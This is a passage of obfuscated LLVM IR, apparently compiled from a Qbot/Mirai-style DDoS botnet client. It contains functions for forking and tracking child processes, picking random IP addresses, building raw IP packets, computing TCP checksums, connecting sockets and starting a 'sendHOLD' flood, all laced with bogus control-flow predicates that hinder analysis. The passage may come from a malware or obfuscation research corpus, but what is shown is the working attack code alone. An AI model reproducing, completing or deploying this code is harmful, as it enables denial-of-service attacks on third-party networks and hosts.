  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %26

; <label>:24:                                     ; preds = %originalBBpart2
  %25 = load i32, i32* %10, align 4
  store i32 %25, i32* %9, align 4
  br label %95

; <label>:26:                                     ; preds = %originalBBpart2
  %27 = load i32, i32* @x.39
  %28 = load i32, i32* @y.40
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = load i64, i64* @numpids, align 8
  %36 = add i64 %35, 1
  store i64 %36, i64* @numpids, align 8
  %37 = load i64, i64* @numpids, align 8
  %38 = add i64 %37, 1
  %39 = mul i64 %38, 4
  %40 = call noalias i8* @malloc(i64 %39) #2
  %41 = bitcast i8* %40 to i32*
  store i32* %41, i32** %11, align 8
  store i32 0, i32* %12, align 4
  %42 = load i32, i32* @x.39
  %43 = load i32, i32* @y.40
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart213, label %originalBB1alteredBB

originalBBpart213:                                ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %66, %originalBBpart213
  %51 = load i32, i32* %12, align 4
  %52 = zext i32 %51 to i64
  %53 = load i64, i64* @numpids, align 8
  %54 = sub i64 %53, 1
  %55 = icmp ult i64 %52, %54
  br i1 %55, label %56, label %69

; <label>:56:                                     ; preds = %50
  %57 = load i32*, i32** @pids, align 8
  %58 = load i32, i32* %12, align 4
  %59 = zext i32 %58 to i64
  %60 = getelementptr inbounds i32, i32* %57, i64 %59
  %61 = load i32, i32* %60, align 4
  %62 = load i32*, i32** %11, align 8
  %63 = load i32, i32* %12, align 4
  %64 = zext i32 %63 to i64
  %65 = getelementptr inbounds i32, i32* %62, i64 %64
  store i32 %61, i32* %65, align 4
  br label %66

; <label>:66:                                     ; preds = %56
  %67 = load i32, i32* %12, align 4
  %68 = add i32 %67, 1
  store i32 %68, i32* %12, align 4
  br label %50

; <label>:69:                                     ; preds = %50
  %70 = load i32, i32* @x.39
  %71 = load i32, i32* @y.40
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %69
  %78 = load i32, i32* %10, align 4
  %79 = load i32*, i32** %11, align 8
  %80 = load i64, i64* @numpids, align 8
  %81 = sub i64 %80, 1
  %82 = getelementptr inbounds i32, i32* %79, i64 %81
  store i32 %78, i32* %82, align 4
  %83 = load i32*, i32** @pids, align 8
  %84 = bitcast i32* %83 to i8*
  call void @free(i8* %84) #2
  %85 = load i32*, i32** %11, align 8
  store i32* %85, i32** @pids, align 8
  %86 = load i32, i32* %10, align 4
  store i32 %86, i32* %9, align 4
  %87 = load i32, i32* @x.39
  %88 = load i32, i32* @y.40
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br label %95

; <label>:95:                                     ; preds = %originalBBpart217, %24
  %96 = load i32, i32* @x.39
  %97 = load i32, i32* @y.40
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %95
  %104 = load i32, i32* %9, align 4
  %105 = load i32, i32* @x.39
  %106 = load i32, i32* @y.40
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  ret i32 %104

originalBBalteredBB:                              ; preds = %originalBB, %0
  %113 = alloca i32, align 4
  %114 = alloca i32, align 4
  %115 = alloca i32*, align 8
  %116 = alloca i32, align 4
  %117 = call i32 @fork() #2
  store i32 %117, i32* %114, align 4
  %118 = load i32, i32* %114, align 4
  %119 = icmp ule i32 %118, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %120 = load i64, i64* @numpids, align 8
  %_ = sub i64 0, %120
  %gen = add i64 %_, 1
  %_2 = sub i64 0, %120
  %gen3 = add i64 %_2, 1
  %121 = add i64 %120, 1
  store i64 %121, i64* @numpids, align 8
  %122 = load i64, i64* @numpids, align 8
  %_4 = sub i64 0, %122
  %gen5 = add i64 %_4, 1
  %123 = add i64 %122, 1
  %_6 = sub i64 %123, 4
  %gen7 = mul i64 %_6, 4
  %_8 = sub i64 %123, 4
  %gen9 = mul i64 %_8, 4
  %_10 = sub i64 %123, 4
  %gen11 = mul i64 %_10, 4
  %124 = mul i64 %123, 4
  %125 = call noalias i8* @malloc(i64 %124) #2
  %126 = bitcast i8* %125 to i32*
  store i32* %126, i32** %11, align 8
  store i32 0, i32* %12, align 4
  br label %originalBB1

originalBB15alteredBB:                            ; preds = %originalBB15, %69
  %127 = load i32, i32* %10, align 4
  %128 = load i32*, i32** %11, align 8
  %129 = load i64, i64* @numpids, align 8
  %130 = sub i64 %129, 1
  %131 = getelementptr inbounds i32, i32* %128, i64 %130
  store i32 %127, i32* %131, align 4
  %132 = load i32*, i32** @pids, align 8
  %133 = bitcast i32* %132 to i8*
  call void @free(i8* %133) #2
  %134 = load i32*, i32** %11, align 8
  store i32* %134, i32** @pids, align 8
  %135 = load i32, i32* %10, align 4
  store i32 %135, i32* %9, align 4
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %95
  %136 = load i32, i32* %9, align 4
  br label %originalBB19
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

; <label>:33:                                     ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29

; <label>:39:                                     ; preds = %29
  %40 = load i32, i32* @x.43
  %41 = load i32, i32* @y.44
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %39
  %48 = load i64, i64* %5, align 8
  %49 = xor i64 %48, -1
  %50 = trunc i64 %49 to i16
  %51 = load i32, i32* @x.43
  %52 = load i32, i32* @y.44
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i16 %50

originalBBalteredBB:                              ; preds = %originalBB, %39
  %59 = load i64, i64* %5, align 8
  %_ = sub i64 0, %59
  %gen = add i64 %_, -1
  %_1 = shl i64 %59, -1
  %_2 = shl i64 %59, -1
  %_3 = shl i64 %59, -1
  %60 = xor i64 %59, -1
  %61 = trunc i64 %60 to i16
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = load i32, i32* @x.49
  %3 = load i32, i32* @y.50
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  %12 = load i32, i32* %11, align 4
  %13 = icmp sgt i32 3, %12
  %14 = load i32, i32* @x.49
  %15 = load i32, i32* @y.50
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %22, label %39

; <label>:22:                                     ; preds = %originalBBpart2
  %23 = load i32, i32* @x.49
  %24 = load i32, i32* @y.50
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %22
  store i32 1, i32* %10, align 4
  %31 = load i32, i32* @x.49
  %32 = load i32, i32* @y.50
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %58

; <label>:39:                                     ; preds = %originalBBpart2
  %40 = load i32, i32* @x.49
  %41 = load i32, i32* @y.50
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %39
  %48 = load i32, i32* %11, align 4
  %49 = call i32 @close(i32 %48)
  store i32 0, i32* %10, align 4
  %50 = load i32, i32* @x.49
  %51 = load i32, i32* @y.50
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %58

; <label>:58:                                     ; preds = %originalBBpart28, %originalBBpart24
  %59 = load i32, i32* @x.49
  %60 = load i32, i32* @y.50
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %58
  %67 = load i32, i32* %10, align 4
  %68 = load i32, i32* @x.49
  %69 = load i32, i32* @y.50
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i32 %67

originalBBalteredBB:                              ; preds = %originalBB, %1
  %76 = alloca i32, align 4
  %77 = alloca i32, align 4
  store i32 %0, i32* %77, align 4
  %78 = load i32, i32* %77, align 4
  %79 = icmp sgt i32 3, %78
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %22
  store i32 1, i32* %10, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %39
  %80 = load i32, i32* %11, align 4
  %81 = call i32 @close(i32 %80)
  store i32 0, i32* %10, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %58
  %82 = load i32, i32* %10, align 4
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %93

; <label>:14:                                     ; preds = %2
  %15 = load i32, i32* @x.51
  %16 = load i32, i32* @y.52
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load %struct.hostent*, %struct.hostent** %6, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 4
  %25 = load i8**, i8*** %24, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %29 = bitcast %struct.in_addr* %28 to i8*
  %30 = load %struct.hostent*, %struct.hostent** %6, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 3
  %32 = load i32, i32* %31, align 4
  %33 = sext i32 %32 to i64
  call void @bcopy(i8* %27, i8* %29, i64 %33) #2
  %34 = load i16, i16* %5, align 2
  %35 = call zeroext i16 @htons(i16 zeroext %34) #13
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %37, align 4
  %38 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %38, i32* %9, align 4
  %39 = load i32, i32* %9, align 4
  %40 = bitcast i32* %8 to i8*
  %41 = call i32 @setsockopt(i32 %39, i32 6, i32 1, i8* %40, i32 4) #2
  %42 = load i32, i32* %9, align 4
  %43 = icmp eq i32 %42, -1
  %44 = load i32, i32* @x.51
  %45 = load i32, i32* @y.52
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %53

; <label>:52:                                     ; preds = %originalBBpart2
  store i32 0, i32* %3, align 4
  br label %93

; <label>:53:                                     ; preds = %originalBBpart2
  %54 = load i32, i32* @x.51
  %55 = load i32, i32* @y.52
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  %62 = load i32, i32* %9, align 4
  %63 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %64 = call i32 @connect(i32 %62, %struct.sockaddr* %63, i32 16)
  %65 = icmp eq i32 %64, -1
  %66 = load i32, i32* @x.51
  %67 = load i32, i32* @y.52
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %65, label %74, label %75

; <label>:74:                                     ; preds = %originalBBpart24
  store i32 0, i32* %3, align 4
  br label %93

; <label>:75:                                     ; preds = %originalBBpart24
  %76 = load i32, i32* @x.51
  %77 = load i32, i32* @y.52
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %75
  %84 = load i32, i32* %9, align 4
  store i32 %84, i32* %3, align 4
  %85 = load i32, i32* @x.51
  %86 = load i32, i32* @y.52
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %93

; <label>:93:                                     ; preds = %originalBBpart28, %74, %52, %13
  %94 = load i32, i32* %3, align 4
  ret i32 %94

originalBBalteredBB:                              ; preds = %originalBB, %14
  %95 = load %struct.hostent*, %struct.hostent** %6, align 8
  %96 = getelementptr inbounds %struct.hostent, %struct.hostent* %95, i32 0, i32 4
  %97 = load i8**, i8*** %96, align 8
  %98 = getelementptr inbounds i8*, i8** %97, i64 0
  %99 = load i8*, i8** %98, align 8
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %101 = bitcast %struct.in_addr* %100 to i8*
  %102 = load %struct.hostent*, %struct.hostent** %6, align 8
  %103 = getelementptr inbounds %struct.hostent, %struct.hostent* %102, i32 0, i32 3
  %104 = load i32, i32* %103, align 4
  %105 = sext i32 %104 to i64
  call void @bcopy(i8* %99, i8* %101, i64 %105) #2
  %106 = load i16, i16* %5, align 2
  %107 = call zeroext i16 @htons(i16 zeroext %106) #13
  %108 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %107, i16* %108, align 2
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %109, align 4
  %110 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %110, i32* %9, align 4
  %111 = load i32, i32* %9, align 4
  %112 = bitcast i32* %8 to i8*
  %113 = call i32 @setsockopt(i32 %111, i32 6, i32 1, i8* %112, i32 4) #2
  %114 = load i32, i32* %9, align 4
  %115 = icmp eq i32 %114, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  %116 = load i32, i32* %9, align 4
  %117 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %118 = call i32 @connect(i32 %116, %struct.sockaddr* %117, i32 16)
  %119 = icmp eq i32 %118, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %75
  %120 = load i32, i32* %9, align 4
  store i32 %120, i32* %3, align 4
  br label %originalBB6
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
